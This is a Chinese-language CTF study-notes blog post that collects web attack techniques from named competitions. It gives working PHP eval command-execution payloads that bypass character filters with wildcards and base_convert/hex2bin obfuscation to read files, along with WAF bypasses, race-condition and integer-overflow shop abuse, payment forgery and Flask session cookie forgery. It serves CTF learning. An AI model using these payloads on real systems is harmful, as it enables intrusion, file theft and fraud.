---
layout: post
title: "web常见攻击方法"
date: 2018-10-23 15:23:57 +0800
description: ""
category: ctf/web
tags: []
---

```
python -m SimpleHTTPServer 80
```

## 代码审计

#### 直接命令执行

###### 极限利用（限制可执行命令的长度和字符类型）：[Web-2，安恒月赛-2018-09](http://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/#Web2)

```php
    if(strlen($code)>35){ #限制长度小于等于35
        die("Long.");
    }
    if(preg_match("/[A-Za-z0-9_$]+/",$code)){ #限制不能使用大小写字符、数字、下划线和美元符
        die("NO.");
    }
    @eval($code);
```

原理：利用通配符`? * %`执行命令：`/???/??? => /bin/cat `，利用模板渲染回显结果：`<?=``?> `，完整利用步骤如下：

```
?><?=`/???/???%20/???/???/????/*`?>
"/bin/cat /var/www/html/index.php" #读取源码
?><?=`/???/???%20/????`;?>
"/bin/cat /flag" #读取flag
```

###### [命令注入及绕过waf](https://www.jianshu.com/p/000a4ad1b933)：ezsql，安恒月赛-2018-11

```
空格 $IFS tab
/    expr substr $(pwd) 1 1 #结合空格替换需要加入反斜杠区分`expr$IFS\substr$IFS$(pwd)$IFS\1$IFS\1`
     grep -ri . dir #列出dir（用.或*表示当前目录）目录下所有文件内容。-r递归遍历目录，-i忽略大小写，.匹配所有
```

###### 进制转换：[Love-Math，CISCN-2019](https://www.cnblogs.com/20175211lyz/p/11588219.html)

```php
//base_convert(37907361743,10,36) => 将10进制转36进制，得到a-z，"hex2bin"
//dechex(1598506324) => 将十进制转换为十六进制，"5f474554"
//$pi=hex2bin("5f474554") => $pi="_GET"   //hex2bin将一串16进制数转换为二进制字符串，下划线、空格、星号等特殊符号无法直接通过base_convert进制转换，因此需要借助hex2bin
//($$pi){pi}(($$pi){abs}) => ($_GET){pi}($_GET){abs}  //{}可以代替[]
$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat flag.php
//(base_convert(53179,10,36)=1517) ^ (base_convert(110136,10,36)=nrtc) = _GET
0=system&1=cat%20flag.php&c=$pi=base_convert;$pi=$pi(53179,10,36)^$pi(110136,10,36);$$pi{0}($$pi{1})

//base_convert(696468,10,36) => "exec"
//$pi(8768397090111664438,10,30) => "getallheaders"
//exec(getallheaders(){1})
$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1}) //再通过BP设置HTTP头：1: cat flag.php

//exec('hex2bin(dechex(109270211257898))') => exec('cat f*')
($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))

//system('cat'.dechex(16)^asinh^pi) => system('cat *')
base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi)) //'10'^'as'^'pi'=>' *'
```

## 购物商城

#### 条件竞争&整数溢出：[itshop，护网杯-2018](http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/#ltshop)

一个账户的两个登陆同时买辣条，只会扣一次钱，却会得到两个辣条，利用burpsuite进行条件竞争。

整数溢出：

int： `2**32-1 = 4294967295`

long： `2**63 -1 = 9223372036854775807`

unsignedlong： `2**64-1 = 18446744073709551615`

由于5个辣条兑换1个辣条之王，构造兑换数量，使兑换数量*5溢出，小于已有辣条数量即可，因此兑换数量为：

```python
i = 2**64 // 5 + 1 # 3689348814741910324
j = i * 5 % (2 ** 64) # 4
```

#### 伪造购物用户：[ezshop，安恒月赛-2018-10](https://www.smi1e.top/?p=119#ezshop)

查询数据库user表，查到admin的用户id，订单支付的时候，将当前用户id修改为admin的用户id，伪造签名，从而使用admin的账号代为支付。

## Python站

#### flask-session伪造：[留言板，中原工学院-2018](https://mp.weixin.qq.com/s/BMsWmiy9Hs0BRqr9EibThQ)

利用[Flask-session Cookie Decoder/Encoder](https://github.com/noraj/flask-session-cookie-manager)伪造admin的cookie，必须使用`python3`。

```powershell
>python3 D:\ctf\tools\packet\flask-session-cookie-manager\session_cookie_manager.py decode -c eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sIm5hbWUiOiJ0ZXN0In0.XCLoGg.hkrHrcE6cV_TTN8o1UCEvQjmpik -s dropseckey123
{'_flashes': [('message', '登录成功')], 'name': 'test'}
>python3 D:\ctf\tools\packet\flask-session-cookie-manager\session_cookie_manager.py encode -t "{'_flashes': [('message', '登录成功')], 'name': 'admin'}" -s dropseckey123
eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sIm5hbWUiOiJhZG1pbiJ9.XCLpjw.3pQY5fDClFG0yNTv2EZKyp6S_eE
```

